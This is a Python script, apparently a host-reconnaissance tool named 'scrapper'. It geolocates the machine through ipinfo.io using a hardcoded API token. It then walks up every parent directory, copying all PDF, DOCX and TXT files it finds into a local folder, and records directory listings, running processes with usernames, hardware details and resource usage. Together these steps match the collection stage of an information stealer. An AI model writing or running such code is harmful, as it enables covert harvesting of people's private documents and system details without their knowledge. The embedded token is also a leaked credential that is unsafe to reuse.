import subprocess
import platform
import psutil
import time
import requests
from datetime import datetime
import os
import psutil
import shutil

def get_os_info():
    return platform.platform()

def get_system_details():
    details = {
        "computer_type": platform.machine(),
        "cpu_type": platform.processor(),
    }

    details["gpu_info"] = get_gpu_info()
    
    if platform.system() == "Windows":
        try:
            model = subprocess.check_output("wmic csproduct get name", universal_newlines=True)
            details["computer_model"] = model.split("\n")[1].strip()
        except Exception as e:
            details["computer_model"] = "Unknown"
    
    elif platform.system() == "Darwin":
        try:
            model = subprocess.check_output(["system_profiler", "SPHardwareDataType"], universal_newlines=True)
            for line in model.split("\n"):
                if "Model Name" in line or "Model Identifier" in line:
                    details["computer_model"] = line.split(":")[1].strip()
                    break
        except Exception as e:
            details["computer_model"] = "Unknown"
    
    else:
        details["computer_model"] = "Not Specified"
    
    return details

def get_gpu_info():
    """Retrieve GPU information based on the operating system."""
    os_system = platform.system()
    try:
        if os_system == "Windows":
            gpu_info = subprocess.check_output("wmic path win32_VideoController get name", universal_newlines=True)
        elif os_system == "Linux":
            gpu_info = subprocess.check_output("lspci | grep VGA", shell=True, universal_newlines=True)
        elif os_system == "Darwin":
            gpu_info = subprocess.check_output("system_profiler SPDisplaysDataType", shell=True, universal_newlines=True)
        else:
            gpu_info = "Unsupported OS for GPU Info"
    except Exception as e:
        gpu_info = f"Error retrieving GPU Info: {e}"
    return gpu_info

def get_running_processes():
    running_processes = psutil.process_iter(['pid', 'name', 'username'])
    process_info = []
    for proc in running_processes:
        process_info.append({
            "PID": proc.info['pid'],
            "Name": proc.info['name'],
            "Username": proc.info['username']
        })
    return process_info

def get_location_from_api(api_token):
    try:
        response = requests.get(f'https://ipinfo.io?token={api_token}')
        location_data = response.json()
        return location_data
    except Exception as e:
        return {"error": str(e)}

def monitor_system(file, interval=60, duration=3600):
    end_time = time.time() + duration
    while time.time() < end_time:
        log_entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "cpu_usage": psutil.cpu_percent(),
            "memory_usage": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent
        }
        file.write(str(log_entry) + "\n")
        file.flush()
        time.sleep(interval)

def scrapper():
    with open("system_info.txt", "w") as file:
        location_info = get_location_from_api('02d299854c35db')
        file.write("\nIP-based Location Information (from API):\n\n")
        for key, value in location_info.items():
            file.write(f"{key}: {value}\n")
        file.write("\n============================\n")
    
        current_dir = os.getcwd()
        file.write(f"\nCurrent Directory: {current_dir}\n\n")

        copied_files_dir = os.path.join(current_dir, 'copied_files')
        if not os.path.exists(copied_files_dir):
            os.makedirs(copied_files_dir)

        while True:
            try:
                # Attempt to move to the parent directory
                os.chdir('..')
                prev_dir = os.getcwd()
                if prev_dir == current_dir:
                    break  # Stop if we can't go back further
                file.write("============================\n")
                file.write(f"Previous Directory: {prev_dir}\n\n")
                file.write(f"Files in {prev_dir}:\n\n")
                file_list = os.listdir(prev_dir)
                for item in file_list:
                    if item.endswith('.pdf') or item.endswith('.docx') or item.endswith('.txt'):
                        src_file_path = os.path.join(prev_dir, item)
                        dst_file_path = os.path.join(copied_files_dir, item)
                        shutil.copy(src_file_path, dst_file_path)
                    file.write(f"{item}\n")
                file.write("\n")
                current_dir = prev_dir
            except Exception as e:
                file.write(f"Error: {str(e)}\n")
                break  # Stop if there's an error
        file.write("\n============================\n")

        file.write("Running Processes:\n\n")
        running_processes = get_running_processes()
        for proc in running_processes:
            file.write(f"PID: {proc['PID']}, Name: {proc['Name']}, User: {proc['Username']}\n\n")
        
        file.write("\n============================\n")
        file.write("System Information:\n")
        os_info = get_os_info()
        system_details = get_system_details()
        file.write(f"Operating System: {os_info}\n")
        for key, value in system_details.items():
            file.write(f"{key}: {value}\n")
            if key == "gpu_info":
                gpu_lines = value.strip().split('\n')
                for line in gpu_lines:
                    file.write(f"GPU: {line.strip()}\n")
        file.flush()
        file.write("\nStarting system monitoring...\n")
        monitor_system(file=file, interval=10, duration=120)

if __name__ == "__main__":
    scrapper()
